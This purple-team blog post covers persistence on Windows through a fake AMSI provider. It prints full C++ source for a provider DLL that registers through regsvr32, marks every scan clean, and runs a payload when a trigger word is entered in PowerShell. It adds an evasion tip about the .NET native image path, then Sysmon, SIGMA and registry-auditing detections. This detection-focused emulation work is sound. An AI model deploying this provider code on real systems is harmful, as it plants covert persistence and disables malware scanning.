# https://ipurple.team/2026/07/13/amsi-provider/

[Skip to content](https://ipurple.team/2026/07/13/amsi-provider/#wp--skip-link--target)

[Purple Team](https://ipurple.team/category/purple-team/)

## AMSI Provider

Published by

Administrator

on

[July 13, 2026](https://ipurple.team/2026/07/13/amsi-provider/)

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-providerv2.png?w=1024)

The Antimalware Scan Interface (AMSI) is a Microsoft control that directs PowerShell content to the installed antimalware engine or EDR to conduct a scan and identify malicious indicators. However, for functionality purposes Microsoft permits third-party applications to register AMSI providers with the operating system in order to communicate with the interface. Threat actors with elevated permissions on the asset could abuse this behaviour and register a fake AMSI provider to establish persistence. Specifically, when the arbitrary AMSI is registered, an action is performed such as execution of code or executable when a defined string is inserted into a PowerShell console.

## Playbook

The Antimalware Scan Interface (AMSI) is a Windows security interface that enables applications to submit potentially risky content to an installed antimalware engine before the content is executed. AMSI was introduced to enable security products use this engine to scan scripts or content. For example, when a command is executed via PowerShell, the content is passed to AMSI which then forwards to the registered antimalware provider and returns a result such as clean, suspicious, or malicious.

AMSI was designed by Microsoft as a vendor-agnostic interface which can communicate with the endpoint in order to prevent the execution of malware. Threat actors could abuse AMSI by registering a provider for persistence if elevated access has been achieved.

Microsoft has disclosed to the public, the code for implementing a sample AMSI provider and an [article](https://pentestlab.blog/2021/05/17/persistence-amsi/) was released that explained the technique. The full proof of concept of abusing arbitrary AMSI providers for persistence can be found in the [AMSI-Provider](https://github.com/netbiosX/AMSI-Provider/) repository. The code below can be used to emulate the technique. Initially, when PowerShell submits content for scanning, AMSI calls the fake provider `Scan()` method. The provider checks the trigger strings and upon matching a function is executed.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148<br>149<br>150<br>151<br>152<br>153<br>154<br>155<br>156<br>157<br>158<br>159<br>160<br>161<br>162<br>163<br>164<br>165<br>166<br>167<br>168<br>169<br>170<br>171<br>172<br>173<br>174<br>175<br>176<br>177<br>178<br>179<br>180<br>181<br>182<br>183<br>184<br>185<br>186<br>187<br>188<br>189<br>190<br>191<br>192<br>193<br>194<br>195<br>196<br>197<br>198<br>199<br>200<br>201<br>202<br>203<br>204<br>205<br>206<br>207<br>208<br>209<br>210<br>211<br>212<br>213<br>214<br>215<br>216<br>217<br>218<br>219 | `#include "stdafx.h"`<br>`#include <process.h>`<br>`#include <subauth.h>`<br>`#include <strsafe.h>`<br>`#include <amsi.h>`<br>`#include <windows.h>`<br>`#include <wrl/module.h>`<br>`using``namespace``Microsoft::WRL;`<br>`HMODULE``g_currentModule;`<br>`typedef``void``(NTAPI* _RtlInitUnicodeString)(`<br>```PUNICODE_STRING DestinationString,`<br>```PCWSTR``SourceString`<br>```);`<br>`typedef``NTSYSAPI``BOOLEAN``(NTAPI* _RtlEqualUnicodeString)(`<br>```PUNICODE_STRING String1,`<br>```PUNICODE_STRING String2,`<br>```BOOLEAN``CaseInsetive`<br>```);`<br>`DWORD``WINAPI MyThreadFunction(``LPVOID``lpParam);`<br>`void``ErrorHandler(``LPTSTR``lpszFunction);`<br>`BOOL``APIENTRY DllMain(``HMODULE``module,``DWORD``reason,``LPVOID``reserved)`<br>`{`<br>```switch``(reason)`<br>```{`<br>```case``DLL_PROCESS_ATTACH:`<br>```g_currentModule = module;`<br>```DisableThreadLibraryCalls(module);`<br>```Module<InProc>::GetModule().Create();`<br>```break``;`<br>```case``DLL_PROCESS_DETACH:`<br>```Module<InProc>::GetModule().Terminate();`<br>```break``;`<br>```}`<br>```return``TRUE;`<br>`}`<br>`#pragma region COM server boilerplate`<br>`HRESULT``WINAPI DllCanUnloadNow()`<br>`{`<br>```return``Module<InProc>::GetModule().Terminate() ? S_OK : S_FALSE;`<br>`}`<br>`STDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_``LPVOID``FAR* ppv)`<br>`{`<br>```return``Module<InProc>::GetModule().GetClassObject(rclsid, riid, ppv);`<br>`}`<br>`#pragma endregion`<br>`class`<br>```DECLSPEC_UUID(``"2E5D8A62-77F9-4F7B-A90C-2744820139B2"``)`<br>```PentestlabAmsiProvider :``public``RuntimeClass<RuntimeClassFlags<ClassicCom>, IAntimalwareProvider, FtmBase>`<br>`{`<br>`public``:`<br>```IFACEMETHOD(Scan)(_In_ IAmsiStream * stream, _Out_ AMSI_RESULT * result)``override``;`<br>```IFACEMETHOD_(``void``, CloseSession)(_In_``ULONGLONG``session)``override``;`<br>```IFACEMETHOD(DisplayName)(_Outptr_``LPWSTR``* displayName)``override``;`<br>`private``:`<br>```LONG``m_requestNumber = 0;`<br>`};`<br>`HRESULT``PentestlabAmsiProvider::Scan(_In_ IAmsiStream* stream, _Out_ AMSI_RESULT* result)`<br>`{`<br>```_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandle(``L"ntdll.dll"``),``"RtlInitUnicodeString"``);`<br>```_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)GetProcAddress(GetModuleHandle(``L"ntdll.dll"``),``"RtlEqualUnicodeString"``);`<br>```UNICODE_STRING myTriggerString1;`<br>```RtlInitUnicodeString(&myTriggerString1,``L"pentestlab"``);`<br>```UNICODE_STRING myTriggerString2;`<br>```RtlInitUnicodeString(&myTriggerString2,``L"\"pentestlab\""``);`<br>```UNICODE_STRING myTriggerString3;`<br>```RtlInitUnicodeString(&myTriggerString3,``L"'pentestlab'"``);`<br>```ULONG``actualSize;`<br>```ULONGLONG``contentSize;`<br>```if``(!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_SIZE,``sizeof``(``ULONGLONG``),``reinterpret_cast``<``PBYTE``>(&contentSize), &actualSize)) &&`<br>```actualSize ==``sizeof``(``ULONGLONG``))`<br>```{`<br>```*result = AMSI_RESULT_NOT_DETECTED;`<br>```return``S_OK;`<br>```}`<br>```PBYTE``contentAddress;`<br>```if``(!SUCCEEDED(stream->GetAttribute(AMSI_ATTRIBUTE_CONTENT_ADDRESS,``sizeof``(``PBYTE``),``reinterpret_cast``<``PBYTE``>(&contentAddress), &actualSize)) &&`<br>```actualSize ==``sizeof``(``PBYTE``))`<br>```{`<br>```*result = AMSI_RESULT_NOT_DETECTED;`<br>```return``S_OK;`<br>```}`<br>```if``(contentAddress)`<br>```{`<br>```if``(contentSize < 50)`<br>```{`<br>```UNICODE_STRING myuni;`<br>```myuni.Buffer = (``PWSTR``)contentAddress;`<br>```myuni.Length = (``USHORT``)contentSize;`<br>```myuni.MaximumLength = (``USHORT``)contentSize;`<br>```if``(RtlEqualUnicodeString(&myTriggerString1, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString2, &myuni, TRUE) || RtlEqualUnicodeString(&myTriggerString3, &myuni, TRUE))`<br>```{`<br>```DWORD``thId;`<br>```CreateThread(NULL, 0, MyThreadFunction, NULL, 0, &thId);`<br>```}`<br>```}`<br>```}`<br>```*result = AMSI_RESULT_NOT_DETECTED;`<br>```return``S_OK;`<br>`}`<br>`void``PentestlabAmsiProvider::CloseSession(_In_``ULONGLONG``session)`<br>`{`<br>`}`<br>`HRESULT``PentestlabAmsiProvider::DisplayName(_Outptr_``LPWSTR``* displayName)`<br>`{`<br>```*displayName =``const_cast``<``LPWSTR``>(``L"Sample AMSI Provider"``);`<br>```return``S_OK;`<br>`}`<br>`CoCreatableClass(PentestlabAmsiProvider);`<br>`DWORD``WINAPI MyThreadFunction(``LPVOID``lpParam)`<br>`{`<br>```system``(``"c:\\Windows\\System32\\calc.exe"``);`<br>```return``0;`<br>`}`<br>`#pragma region Install / uninstall`<br>`HRESULT``SetKeyStringValue(_In_``HKEY``key, _In_opt_``PCWSTR``subkey, _In_opt_``PCWSTR``valueName, _In_``PCWSTR``stringValue)`<br>`{`<br>```LONG``status = RegSetKeyValue(key, subkey, valueName, REG_SZ, stringValue, (wcslen(stringValue) + 1) *``sizeof``(``wchar_t``));`<br>```return``HRESULT_FROM_WIN32(status);`<br>`}`<br>`STDAPI DllRegisterServer()`<br>`{`<br>```wchar_t``modulePath[MAX_PATH];`<br>```if``(GetModuleFileName(g_currentModule, modulePath, ARRAYSIZE(modulePath)) >= ARRAYSIZE(modulePath))`<br>```{`<br>```return``E_UNEXPECTED;`<br>```}`<br>```wchar_t``clsidString[40];`<br>```if``(StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)`<br>```{`<br>```return``E_UNEXPECTED;`<br>```}`<br>```wchar_t``keyPath[200];`<br>```HRESULT``hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath),``L"Software\\Classes\\CLSID\\%ls"``, clsidString);`<br>```if``(FAILED(hr))``return``hr;`<br>```hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath,``nullptr``,``L"PentestlabAmsiProvider"``);`<br>```if``(FAILED(hr))``return``hr;`<br>```hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath),``L"Software\\Classes\\CLSID\\%ls\\InProcServer32"``, clsidString);`<br>```if``(FAILED(hr))``return``hr;`<br>```hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath,``nullptr``, modulePath);`<br>```if``(FAILED(hr))``return``hr;`<br>```hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath,``L"ThreadingModel"``,``L"Both"``);`<br>```if``(FAILED(hr))``return``hr;`<br>```// Register this CLSID as an anti-malware provider.`<br>```hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath),``L"Software\\Microsoft\\AMSI\\Providers\\%ls"``, clsidString);`<br>```if``(FAILED(hr))``return``hr;`<br>```hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath,``nullptr``,``L"PentestlabAmsiProvider"``);`<br>```if``(FAILED(hr))``return``hr;`<br>```return``S_OK;`<br>`}`<br>`STDAPI DllUnregisterServer()`<br>`{`<br>```wchar_t``clsidString[40];`<br>```if``(StringFromGUID2(__uuidof(PentestlabAmsiProvider), clsidString, ARRAYSIZE(clsidString)) == 0)`<br>```{`<br>```return``E_UNEXPECTED;`<br>```}`<br>```// Unregister this CLSID as an anti-malware provider.`<br>```wchar_t``keyPath[200];`<br>```HRESULT``hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath),``L"Software\\Microsoft\\AMSI\\Providers\\%ls"``, clsidString);`<br>```if``(FAILED(hr))``return``hr;`<br>```LONG``status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);`<br>```if``(status != NO_ERROR && status != ERROR_PATH_NOT_FOUND)``return``HRESULT_FROM_WIN32(status);`<br>```// Unregister this CLSID as a COM server.`<br>```hr = StringCchPrintf(keyPath, ARRAYSIZE(keyPath),``L"Software\\Classes\\CLSID\\%ls"``, clsidString);`<br>```if``(FAILED(hr))``return``hr;`<br>```status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);`<br>```if``(status != NO_ERROR && status != ERROR_PATH_NOT_FOUND)``return``HRESULT_FROM_WIN32(status);`<br>```return``S_OK;`<br>`}`<br>`#pragma endregion` |

The fake AMSI provider can be registered with the system via the `regsvr32` utility.

```
regsvr32 AmsiProvider.dll
```

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-register-provider.png?w=936)_Register – AMSI Provider_

When the chosen keyword (`ipurple.team`) is passed on the PowerShell console the target payload is executed, and a connection is established with the command and control.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-ipurple-keyword.png?w=804)_iPurple Keyword_![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-c2.png?w=1024)_C2 Connection_

The following diagram visualizes the technique of persistence via AMSI provider:

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-diagramv2.png?w=1024)_AMSI Provider – Diagram_

The technique abstract is displayed below:

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-technique-abstract.jpg?w=1024)_Technique Abstract_

The playbook of the technique can be found below:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15 | `[``[``Playbook.T1545.015``]``]`<br>`id =``"1.0.0"`<br>`name =``"1.0.0"``-``"AMSI Provider"`<br>`description =``"Establish persistence via malicious AMSI Provider"`<br>`tooling.name =``"AMSI-Provider"`<br>`tooling.references =``[`<br>```"https://github.com/netbiosX/AMSI-Provider"`<br>`]`<br>`executionSteps =``[`<br>```"regsvr32 AmsiProvider.dll"``,`<br>```"ipurple.team"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]` |

## Detection

The technique of abusing custom AMSI providers for persistence is not very common. AMSI providers are stored in the registry, and therefore SOC teams should monitor the `Providers` registry key for non-legitimate entries as a primary detection point. Additionally, AMSI providers are registered using the regsvr32 utility, and have the form of a DLL file. Providers with no valid signature or from unknown signer should be automatically classified as malicious. It should be noted that Microsoft has added provider [signing-check](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iantimalwareprovider) support from Windows 10 onward (version 1903), but it is not enabled by default. Any anomaly in the process tree could be also flagged as arbitrary especially from AMSI-aware applications.

### Registry

AMSI providers are stored in the registry. Execution of the following PowerShell cmdlet can enumerate registered AMSI providers:

|     |     |
| --- | --- |
| 1 | `Get-ChildItem``"HKLM:\SOFTWARE\Microsoft\AMSI\Providers"``-ErrorAction``SilentlyContinue` |

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-enumerate-providers.png?w=925)_Enumerate AMSI Providers_

SOC teams should enable visibility for the `Providers` registry key by adding this key to the Registry container in the Group Policy and apply auditing for the `Set Value`, _`Create Subkey`_, and `Query Value` permissions.

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers
```

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-auditing-registry-key.png?w=1024)_Auditing Registry Key_![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-providers-registry-key-permissions.png?w=1024)_AMSI Providers – Registry Key Permissions_

Registration of an AMSI provider generates the event ID 4663, since the `regsvr32` process attempts to create and modify the value of a registry object.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-event-id-4663.png?w=991)_Event ID 4663_

Registered AMSI providers have the form of a GUID. The `Data` field of the registry key contains the name of the arbitrary AMSI provider.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-registry-key.png?w=1000)_Arbitrary AMSI Provider – Registry Key_

The GUID also matches the CLSID registered under the following key:

```
HKLM\SOFTWARE\Classes\CLSID\<ProviderGUID>\
```

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-clsid.png?w=1024)_AMSI Provider – CLSID_

The `InProcServer32` registry key contains the path of the malicious DLL that was registered previously.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-registry-dll.png?w=925)_Registry DLL_

### DLL

The fake AMSI provider DLL (`AmsiProvider.dll`) is also loaded in the PowerShell process. However, since the name of the DLL is arbitrary the detection focus should be on DLLs that are not signed by a trusted authority. Sophisticated threat actors can sign their DLLs and evade rules associated with DLL signing, but this impose a cost for the attack.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-dll.png?w=778)_AMSI Provider – DLL_

In this particular threat scenario the `AmsiProvider.dll` is not signed.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-unsigned.png?w=399)_AMSI Provider Unsigned_

The following Sysmon rule can be used to detect DLLs that are not signed, and are loaded in a PowerShell process. The rule doesn’t target a defined path that an AMSI provider DLL is loaded and therefore it covers all paths on the system.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14 | `<!-- Detect unsigned DLLs loaded in PowerShell process -->`<br>`<``Sysmon``schemaversion``=``"4.90"``>`<br>```<``EventFiltering``>`<br>```<!-- Event ID 7: ImageLoad -->`<br>```<``RuleGroup``name``=``"Unsigned DLL Loaded by PowerShell"``groupRelation``=``"and"``>`<br>```<``ImageLoad``onmatch``=``"include"``>`<br>```<!-- PowerShell loading unsigned DLLs -->`<br>```<``Image``condition``=``"is"``>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</``Image``>`<br>```<``Signed``condition``=``"is"``>false</``Signed``>`<br>```<``ImageLoaded``condition``=``"end with"``>.dll</``ImageLoaded``>`<br>```</``ImageLoad``>`<br>```</``RuleGroup``>`<br>```</``EventFiltering``>`<br>`</``Sysmon``>` |

However, the rule generates a number of false positives since DLLs inside the `NativeImages` folder are not signed by Microsoft even though these are legitimate and are loaded everytime PowerShell is initiated.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-nativeimages-path.png?w=1024)_NativeImages Path_

An alternative approach is to create an exclusion path that will filter the noise. However, the technique of registering malicious providers for persistence requires elevated access, and threat actors could write the arbitrary DLL into the .NET native image cache path to blend-in and evade detection.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20 | `<!-- Detect unsigned DLLs loaded in PowerShell process, excluding .NET Native Image Cache -->`<br>`<``Sysmon``schemaversion``=``"4.90"``>`<br>```<``EventFiltering``>`<br>```<!-- Include: PowerShell loading unsigned DLLs -->`<br>```<``ImageLoad``onmatch``=``"include"``>`<br>```<``Rule``groupRelation``=``"and"``name``=``"Unsigned DLL Loaded by PowerShell"``>`<br>```<``Image``condition``=``"is"``>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</``Image``>`<br>```<``Signed``condition``=``"is"``>false</``Signed``>`<br>```<``ImageLoaded``condition``=``"end with"``>.dll</``ImageLoaded``>`<br>```</``Rule``>`<br>```</``ImageLoad``>`<br>```<!-- Exclude: .NET Native Image Cache false positives -->`<br>```<``ImageLoad``onmatch``=``"exclude"``>`<br>```<``Rule``groupRelation``=``"and"``name``=``"Exclude .NET Native Image Cache"``>`<br>```<``Image``condition``=``"is"``>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</``Image``>`<br>```<``ImageLoaded``condition``=``"begin with"``>C:\Windows\assembly\NativeImages_</``ImageLoaded``>`<br>```</``Rule``>`<br>```</``ImageLoad``>`<br>```</``EventFiltering``>`<br>`</``Sysmon``>` |

SOC teams should determine which rule should be implemented and tune it accordingly to their environment. When the PowerShell process is created on the system the unsigned DLL will be loaded within the process. Both of the rules above will capture the unsigned DLL under event ID 7.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-imageload-event-sysmon.png?w=1024)_Unsigned DLL Loaded by PowerShell_

### Process Creation

Another detection opportunity is to investigate the process tree. For example, a PowerShell process that creates a suspicious child process (i.e. uknown executable) should immediately classified as malicious. Most EDRs have this capability.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-process.png?w=781)_AMSI Provider – Process Explorer_

During the registration of the fake AMSI provider the `regsvr32` process is also created on the system.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-process-creation.png?w=1024)_AMSI Provider – Process Creation_

The _`AmsiProviderMonitor.exe`_ is a minimalistic agent that runs every three minutes and monitors the registry `HKLM\SOFTWARE\Microsoft\AMSI\Providers` for new entries. Each of these entries are resolved through the CLSIDs _`InProcServer32`_ key to identify unsigned DLLs (via a check in the Authenticode signature) stored in suspicious paths.

![](https://ipurple.team/wp-content/uploads/2026/07/amsi-provider-monitor.png?w=958)_AmsiProviderMonitor.exe_

#### SIGMA

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30 | `title:``Suspicious AMSI Provider Persistence`<br>`id:``41ba0109-3f52-4627-ba43-8583999ced30`<br>`status:``experimental`<br>`description:``Detects registration of a new AMSI Provider or related COM InprocServer32 entry.`<br>`author:``Panos Gkatziroulis`<br>`date:``2026-07-11`<br>`logsource:`<br>```product:``windows`<br>```category:``registry_set`<br>`detection:`<br>```amsi_provider:`<br>```TargetObject|contains``:`<br>```-``'\SOFTWARE\Microsoft\AMSI\Providers\'`<br>```-``'\SOFTWARE\WOW6432Node\Microsoft\AMSI\Providers\'`<br>```com_inproc:`<br>```TargetObject|contains``:`<br>```-``'\SOFTWARE\Classes\CLSID\'`<br>```-``'\InprocServer32'`<br>```suspicious_path:`<br>```Details|contains``:`<br>```-``'\Users\'`<br>```-``'\AppData\'`<br>```-``'\Temp\'`<br>```-``'\Downloads\'`<br>```-``'\ProgramData\'`<br>```-``'\Public\'`<br>```condition:``amsi_provider or (com_inproc and suspicious_path)`<br>`falsepositives:`<br>```-``Legitimate antivirus or EDR product installing an AMSI provider`<br>`level:``high` |

The following table summarizes the data sources and data components required to detect this technique:

| Data Source | Data Components | Detects |
| --- | --- | --- |
| Windows Events | 4663 | Registry Key Modification |
| Windows Events | 4688 | regsvr32 Process |
| Sysmon | 7 | Unsigned AMSI provider DLL |

The technique of installing fake AMSI providers for persistence it is not very common among threat actors. However, proof of concepts exists in the public domain and therefore organizations should take appropriate actions to mitigate risk. It is recommended to enable the signing check for AMSI providers according to Microsoft guidelines to prevent unsigned DLLs from loading into AMSI-aware applications (PowerShell). Furthermore, monitoring the AMSI providers registry key for new entries is considered a reliable detection indicator.

### Share this:

- [Share on X (Opens in new window)X](https://ipurple.team/2026/07/13/amsi-provider/?share=x&nb=1)
- [Email a link to a friend (Opens in new window)Email](mailto:?subject=%5BShared%20Post%5D%20AMSI%20Provider&body=https%3A%2F%2Fipurple.team%2F2026%2F07%2F13%2Famsi-provider%2F&share=email&nb=1)
- [Share on LinkedIn (Opens in new window)LinkedIn](https://ipurple.team/2026/07/13/amsi-provider/?share=linkedin&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://ipurple.team/2026/07/13/amsi-provider/?share=facebook&nb=1)
- [Share on Reddit (Opens in new window)Reddit](https://ipurple.team/2026/07/13/amsi-provider/?share=reddit&nb=1)
- [Share on Mastodon (Opens in new window)Mastodon](https://ipurple.team/2026/07/13/amsi-provider/?share=mastodon&nb=1)
- [More](https://ipurple.team/2026/07/13/amsi-provider/#)

- [Share on X (Opens in new window)X](https://ipurple.team/2026/07/13/amsi-provider/?share=twitter&nb=1)

LikeLoading…

### Leave a comment [Cancel reply](https://ipurple.team/2026/07/13/amsi-provider/\#respond)

Δ

Previous Post

[Windows Service](https://ipurple.team/2026/07/06/windows-service/)

[Provisioning Packages](https://ipurple.team/2026/08/04/provisioning-packages/) →

[Toggle photo metadata visibility](https://ipurple.team/2026/07/13/amsi-provider/#)[Toggle photo comments visibility](https://ipurple.team/2026/07/13/amsi-provider/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website

[Download image](https://ipurple.team/2026/07/13/amsi-provider/#)

- [Comment](https://ipurple.team/2026/07/13/amsi-provider/#respond)
- [Reblog](https://ipurple.team/2026/07/13/amsi-provider/)
- [Subscribe](https://ipurple.team/2026/07/13/amsi-provider/) [Subscribed](https://ipurple.team/2026/07/13/amsi-provider/)




[![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50)Purple Team](https://ipurple.team/)









Join 168 other subscribers

Sign me up


Have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F07%252F13%252Famsi-provider%252F)

- [![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50)Purple Team](https://ipurple.team/)



[Copy shortlink](https://wp.me/pffK4K-NI) [View post in Reader](https://wordpress.com/reader/blogs/225397078/posts/3082)



[Manage subscriptions](https://subscribe.wordpress.com/) [Sign up](https://wordpress.com/start/) [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F07%252F13%252Famsi-provider%252F)



[Report this content](https://wordpress.com/abuse/?report_url=https://ipurple.team/2026/07/13/amsi-provider/)



[Collapse this bar](https://ipurple.team/2026/07/13/amsi-provider/)


%d